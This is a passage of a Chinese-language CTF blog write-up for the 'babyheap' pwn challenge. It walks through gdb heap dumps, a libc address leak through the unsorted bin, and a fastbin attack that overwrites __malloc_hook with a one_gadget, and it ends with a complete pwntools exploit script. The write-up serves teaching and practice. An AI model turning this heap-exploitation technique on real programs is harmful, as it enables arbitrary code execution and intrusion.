+<span style="color:#ae81ff">0x5652899920c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000111</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> header 
+<span style="color:#ae81ff">0x5652899920d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x5652899920e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> fake chunk <span style="color:#ae81ff">2</span> header  
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">alloc(<span style="color:#ae81ff">0x50</span>) <span style="color:#75715e"># 3  </span>
+free(<span style="color:#ae81ff">2</span>) <span style="color:#75715e"># free 2   </span>
+</code></pre></div><p>为了避免 <code>free(2)</code> 和<code>top chunk</code>合并，我们先 <code>alloc(0x50)  </code>
+<code>free</code> 之后：
+<code>[+] unsorted_bins[0]: fw=0x5642e5bb10c0, bk=0x5642e5bb10c0 →   Chunk(addr=0x5642e5bb10d0, size=0x110, flags=PREV_INUSE)</code></p>
+<p>chunk 2 写入了 fd,bk 通过 <code>dump chunk 1</code> 我们就可以得到 main_arena+88 的地址</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x00005642e5bb1000</span>
+<span style="color:#ae81ff">0x5642e5bb1000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span>
+<span style="color:#ae81ff">0x5642e5bb1010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5642e5bb1020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5642e5bb1030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5642e5bb1040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5642e5bb1050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5642e5bb1060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x5642e5bb1070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span> header 
+<span style="color:#ae81ff">0x5642e5bb1080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x5642e5bb1090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x5642e5bb10a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x5642e5bb10b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x5642e5bb10c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000111</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span> 
+<span style="color:#ae81ff">0x5642e5bb10d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00007f99f3137b78</span>	<span style="color:#ae81ff">0x00007f99f3137b78</span> <span style="color:#f92672">=&gt;</span> fd bk 
+<span style="color:#ae81ff">0x5642e5bb10e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span>
+<span style="color:#ae81ff">0x5642e5bb10f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>main_arena+88</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00007f99f3137b78</span>
+<span style="color:#ae81ff">0x7f99f3137b78</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00005642e5bb1230</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7f99f3137b88</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">+</span><span style="color:#ae81ff">104</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00005642e5bb10c0</span>	<span style="color:#ae81ff">0x00005642e5bb10c0</span>
+<span style="color:#ae81ff">0x7f99f3137b98</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00007f99f3137b88</span>	<span style="color:#ae81ff">0x00007f99f3137b88</span>
+<span style="color:#ae81ff">0x7f99f3137ba8</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00007f99f3137b98</span>	<span style="color:#ae81ff">0x00007f99f3137b</span>
+</code></pre></div><p>泄露计算得到 <code>libc</code> 基址</p>
+<h3 id="修改控制流">修改控制流</h3>
+<p>通过堆溢出修改 <code>chunk 1</code> 的 fd 指针指向 <code>malloc_hook</code>  附近</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">free(<span style="color:#ae81ff">1</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x71</span>) <span style="color:#f92672">+</span> p64(malloc_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">27</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
+    fill(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>, payload)
+</code></pre></div><p>会将 <code>chunk 1</code> 放入 <code>fastbin</code> ，再通过堆溢出修改 <code>chunk 1</code>的 <code>fd</code> 指针到 <code>malloc_hook</code> 附近
+此时 <code>fastbin</code>:
+<code>Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x559f678d8080, size=0x70, flags=PREV_INUSE) </code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">32</span>gx <span style="color:#ae81ff">0x000056471f81c000</span>
+<span style="color:#ae81ff">0x56471f81c000</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span>  <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">0</span> 
+<span style="color:#ae81ff">0x56471f81c010</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x56471f81c020</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x56471f81c030</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x56471f81c040</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x56471f81c050</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x56471f81c060</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6161616161616161</span>	<span style="color:#ae81ff">0x6161616161616161</span>
+<span style="color:#ae81ff">0x56471f81c070</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">1</span>
+<span style="color:#ae81ff">0x56471f81c080</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00007fbfe59beaed</span>	<span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#f92672">=&gt;</span> fake fd
+<span style="color:#ae81ff">0x56471f81c090</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x56471f81c0a0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x56471f81c0b0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x6262626262626262</span>	<span style="color:#ae81ff">0x6262626262626262</span>
+<span style="color:#ae81ff">0x56471f81c0c0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000111</span> <span style="color:#f92672">=&gt;</span> chunk <span style="color:#ae81ff">2</span>
+<span style="color:#ae81ff">0x56471f81c0d0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00007fbfe59beb78</span>	<span style="color:#ae81ff">0x00007fbfe59beb78</span>
+<span style="color:#ae81ff">0x56471f81c0e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000071</span>
+<span style="color:#ae81ff">0x56471f81c0f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>可以看一下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x00007fbfe59beaed</span>
+<span style="color:#ae81ff">0x7fbfe59beaed</span> <span style="color:#f92672">&lt;</span>_IO_wide_data_0<span style="color:#f92672">+</span><span style="color:#ae81ff">301</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0xbfe59bd260000000</span>	<span style="color:#ae81ff">0x000000000000007f</span>
+<span style="color:#ae81ff">0x7fbfe59beafd</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0xbfe567fe20000000</span>	<span style="color:#ae81ff">0xbfe567fa0000007f</span>
+<span style="color:#ae81ff">0x7fbfe59beb0d</span> <span style="color:#f92672">&lt;</span>__realloc_hook<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x000000000000007f</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7fbfe59beb1d</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><pre><code>alloc(0x60)  
+alloc(0x60) 
+</code></pre><p>第一次分配刚刚 <code>free</code> 掉的 <code>chunk 1</code>,第二次就会分配到 <code>malloc_hook</code> 附近了<br>
+注：<code>fd = malloc_hook - 27 - 0x8</code>, 分配的时候会将<code> malloc_hook - 27 - 0x8+0x10</code> 分配出去，也就是 <code>malloc_hook-1</code>9 因此我们先写<code>'a'*3 +p64(0)*2</code>
+再写入 <code>one_gadget</code>,刚好会写到 <code>malloc_hook</code> 处</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x<span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>gx <span style="color:#ae81ff">0x7efd4e6aab10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">27</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>
+<span style="color:#ae81ff">0x7efd4e6aaaf0</span> <span style="color:#f92672">&lt;</span>_IO_wide_data_0<span style="color:#f92672">+</span><span style="color:#ae81ff">304</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00007efd4e6a9260</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7efd4e6aab00</span> <span style="color:#f92672">&lt;</span>__memalign_hook<span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7efd4e6aab10</span> <span style="color:#f92672">&lt;</span>__malloc_hook<span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x00007efd4e32b26a</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7efd4e6aab20</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7efd4e6aab30</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+<span style="color:#ae81ff">0x7efd4e6aab40</span> <span style="color:#f92672">&lt;</span>main_arena<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span><span style="color:#f92672">&gt;:</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>成功修改 <code> malloc hook</code>, <code>0x00007efd4e32b26a</code> 就是 <code>one_gadget</code> 的地址
+ps: 上面贴的信息不是同一次脚本跑出来的&hellip;所以有些地方地址不太一样，理解就好&hellip;嘻嘻(我还是不知道怎么早脚本中多次用gdb调试？？每次调试一回来就超时了&hellip;)
+最终 payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+
+DEBUG <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+<span style="color:#66d9ef">if</span> DEBUG:
+    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./babyheap&#39;</span>)
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc-2.23.so&#34;</span>)
+<span style="color:#66d9ef">else</span>:
+    p <span style="color:#f92672">=</span> remote()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>(size):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Command:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Size:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(size))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fill</span>(index, size, content):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Command:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Index:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(index))
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Size:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(size))
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Content:&#39;</span>)
+    p<span style="color:#f92672">.</span>send(content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Command:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;3&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Index:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(index))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump</span>(index):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Command:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;4&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Index:&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(index))
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Content: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>():
+    alloc(<span style="color:#ae81ff">0x60</span>) <span style="color:#75715e"># 0</span>
+    alloc(<span style="color:#ae81ff">0x40</span>) <span style="color:#75715e"># 1</span>
+    fill(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x71</span>))
+    alloc(<span style="color:#ae81ff">0x100</span>) <span style="color:#75715e"># 2</span>
+    fill(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x71</span>))
+    free(<span style="color:#ae81ff">1</span>)  <span style="color:#75715e"># free 1</span>
+    alloc(<span style="color:#ae81ff">0x60</span>) <span style="color:#75715e"># alloc 1</span>
+    fill(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x40</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x111</span>))
+    alloc(<span style="color:#ae81ff">0x50</span>) <span style="color:#75715e"># 3</span>
+    free(<span style="color:#ae81ff">2</span>) <span style="color:#75715e"># free 2</span>
+    leaked <span style="color:#f92672">=</span> u64(dump(<span style="color:#ae81ff">1</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:])
+    <span style="color:#75715e"># return libc_base</span>
+    <span style="color:#66d9ef">return</span> leaked <span style="color:#f92672">-</span><span style="color:#ae81ff">0x3c4b20</span><span style="color:#f92672">-</span><span style="color:#ae81ff">88</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fastbin_attack</span>(libc_base):
+    malloc_hook <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>] <span style="color:#f92672">+</span> libc_base
+    execve_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4526a</span> <span style="color:#f92672">+</span> libc_base
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;malloc_hook @&#34;</span> <span style="color:#f92672">+</span> hex(malloc_hook))
+    free(<span style="color:#ae81ff">1</span>)
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x71</span>) <span style="color:#f92672">+</span> p64(malloc_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">27</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
+    fill(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>, payload)
+    alloc(<span style="color:#ae81ff">0x60</span>)
+    alloc(<span style="color:#ae81ff">0x60</span>)
+    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
+    payload <span style="color:#f92672">+=</span> p64(execve_addr)
+    fill(<span style="color:#ae81ff">2</span>, len(payload), payload)
+    gdb<span style="color:#f92672">.</span>attach(p)
+    alloc(<span style="color:#ae81ff">0x20</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    libc_base <span style="color:#f92672">=</span> leak()
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;get libc_base:&#34;</span> <span style="color:#f92672">+</span> hex(libc_base))
+    fastbin_attack(libc_base)
+    p<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    main()
+</code></pre></div><h3 id="参考链接">参考链接</h3>
+<p><a href="https://blog.csdn.net/qq_29343201/article/details/66476135">https://blog.csdn.net/qq_29343201/article/details/66476135</a>
+<a href="https://blog.csdn.net/qq_33528164/article/details/79515761">https://blog.csdn.net/qq_33528164/article/details/79515761</a></p>
+</div>
+	
+</article></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
